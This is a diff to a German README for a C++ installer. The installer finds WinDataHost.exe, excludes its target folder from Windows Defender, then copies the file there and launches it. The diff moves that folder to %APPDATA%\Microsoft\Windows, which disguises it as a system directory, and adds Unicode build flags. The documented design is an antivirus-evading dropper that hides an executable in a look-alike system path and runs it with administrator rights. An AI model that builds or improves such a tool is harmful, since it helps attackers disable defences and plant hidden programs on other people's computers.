@@ -3,7 +3,7 @@
 Dieses Projekt erstellt ein professionelles Setup-Programm in C++, das:
 1. Prüft, ob es als Administrator ausgeführt wird (und den Benutzer ggf. darauf hinweist).
 2. Nach der Datei `WinDataHost.exe` auf dem Desktop oder im Downloads-Ordner sucht.
-3. Den Ordner `C:\Program Files\WinDataHost` erstellt.
+3. Den Ordner `%APPDATA%\Microsoft\Windows` erstellt/nutzt.
 4. Diesen Ordner vom Windows Defender ausschließt.
 5. Die Datei dorthin kopiert und startet.
 
@@ -19,8 +19,8 @@ Du benötigst einen C++ Compiler für Windows. Empfohlen sind:
 3. Kompiliere das Programm:
 
 ```bash
-# Kompilieren der Quelldatei (C++17 erforderlich)
-cl.exe /O2 /EHsc /std:c++17 main.cpp /link Shell32.lib Ole32.lib User32.lib Gdi32.lib Advapi32.lib /SUBSYSTEM:WINDOWS /OUT:Setup.exe
+# Kompilieren der Quelldatei (C++17 erforderlich, Unicode empfohlen)
+cl.exe /O2 /EHsc /std:c++17 /DUNICODE /D_UNICODE main.cpp /link Shell32.lib Ole32.lib User32.lib Gdi32.lib Advapi32.lib /SUBSYSTEM:WINDOWS /OUT:Setup.exe
 ```
 
 Das Ergebnis ist eine `Setup.exe`. Starte diese per **Rechtsklick -> Als Administrator ausführen**.
@@ -29,7 +29,7 @@ Das Ergebnis ist eine `Setup.exe`. Starte diese per **Rechtsklick -> Als Adminis
 
 ```bash
 # Programm kompilieren (mit statischer Verlinkung für maximale Kompatibilität, C++17 erforderlich)
-g++ -O2 -std=c++17 main.cpp -o Setup.exe -mwindows -static -lshlwapi -lole32 -lshell32 -ladvapi32
+g++ -O2 -std=c++17 -DUNICODE -D_UNICODE main.cpp -o Setup.exe -mwindows -static -lshlwapi -lole32 -lshell32 -ladvapi32
 ```
 
 ## Warum dieser Weg?
